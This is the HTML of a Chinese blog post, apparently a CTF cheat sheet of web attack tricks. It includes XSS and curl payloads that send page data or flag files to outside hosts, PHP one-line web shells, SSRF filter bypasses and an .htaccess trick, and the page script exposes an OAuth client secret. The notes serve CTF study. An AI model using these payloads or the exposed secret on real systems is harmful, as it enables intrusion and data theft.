@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            置顶-持续更新中的CTF备忘录
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2025/01/01/CTF比赛常用-持续更新/"> 
+                    置顶-持续更新中的CTF备忘录 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2025-01-01   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#CTF比赛常用-持续更新"><span class="toc-list-text">CTF比赛常用-持续更新</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#反序列化"><span class="toc-list-text">反序列化</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常识"><span class="toc-list-text">常识</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常见魔法函数"><span class="toc-list-text">常见魔法函数</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XSS"><span class="toc-list-text">XSS</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常识-1"><span class="toc-list-text">常识</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#dom结构"><span class="toc-list-text">dom结构</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#编码"><span class="toc-list-text">编码</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#各种协议"><span class="toc-list-text">各种协议</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#data"><span class="toc-list-text">data</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#打页面源码"><span class="toc-list-text">打页面源码</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#JS发送xml请求"><span class="toc-list-text">JS发送xml请求</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#跨域"><span class="toc-list-text">跨域</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="CTF比赛常用-持续更新"><a href="#CTF比赛常用-持续更新" class="headerlink" title="CTF比赛常用-持续更新"></a>CTF比赛常用-持续更新</h1><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul>
+<li>在反序列化的时候，不会执行__construct里的值</li>
+<li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li>
+<li>找到反序列化的入口很关键</li>
+</ul>
+<h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p>
+<pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&amp;#106=&amp;#0000106</p>
+<p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位</p>
+<h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p>
+<p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p>
+<pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p>
+<p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p>
+<pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
+<h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://ugelgr.ceye.io/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h2 id="JS发送xml请求"><a href="#JS发送xml请求" class="headerlink" title="JS发送xml请求"></a>JS发送xml请求</h2><pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>name传入表达式-&gt;dump加载一个dom  <script></p>
+<p>可以看总结：<a href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p>
+<p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>各种绕过姿势在笔记里有</p>
+<h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限定</p>
+<pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><p><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1ddi759agea21r3r1587uju11ch1r.png-21.1kB"></p>
+<h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><p>数字地址(十进制)：127.0.0.1->2130706433<br>十六进制：127.0.0.1->0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1->0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1->127.1</p>
+<p>在吐司学的一招：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p>
+<pre><code>http://[::ffff:127.0.0.1]/
+也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p>
+<pre><code>    $hostname=$url_parse[&#39;host&#39;]; 
+    $ip=gethostbyname($hostname); 
+    $int_ip=ip2long($ip);
+    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p>
+<pre><code>1. http://0.0.0.0/flag.php
+
+2. http://foo@127.0.0.1:80@baidu.com/flag.php
+
+3. http://%5B::%5D:22/</code></pre><p>第一种是0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p>
+<h2 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h2><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
+<h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
+<p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
+<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="利用报错和外带ood来读取本地文件"><a href="#利用报错和外带ood来读取本地文件" class="headerlink" title="利用报错和外带ood来读取本地文件"></a>利用报错和外带ood来读取本地文件</h2><p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p>
+<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503">https://xz.aliyun.com/t/5503</a></p>
+<p><a href="https://www.jishuwen.com/d/2EGU">https://www.jishuwen.com/d/2EGU</a></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?
+2、是否存在解析漏洞 .php.xxx
+3、是否可以上传其它能解析的后缀？
+4、存在二次渲染漏洞？imagecreatfrompng
+5、apache2.4是否存在0a换行绕过？
+6、htaccess是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>apache中的.htaccess</p>
+<p>将同目录下的jpg解析为php,文件内容如下</p>
+<pre><code>AddType application/x-httpd-php .jpg</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul>
+<li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p>
+</li>
+<li><p>php://filter</p>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li>
+<li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p>
+</li>
+</ul>
+<h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p>
+<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-分号-复杂变量"><a href="#双引号-分号-复杂变量" class="headerlink" title="双引号&分号--复杂变量"></a>双引号&分号--复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785">https://xz.aliyun.com/t/4785</a></p>
+<pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p>
+<h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><p>绕过<code>&lt;?</code>限制的一句话和php标签限制</p>
+<pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><p>动态执行函数</p>
+<pre><code>1、没有过滤括号
+$_GET[1]($_GET[0]);
+
+2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来
+$_GET{1}($_GET{0});</code></pre></script></p>
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2025/01/01/CTF比赛常用-持续更新/">https://hpdoger.cn/2025/01/01/CTF比赛常用-持续更新/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/07/02/前端全局变量劫持/"> 前端全局变量劫持 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Wed Jan 01 2025 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
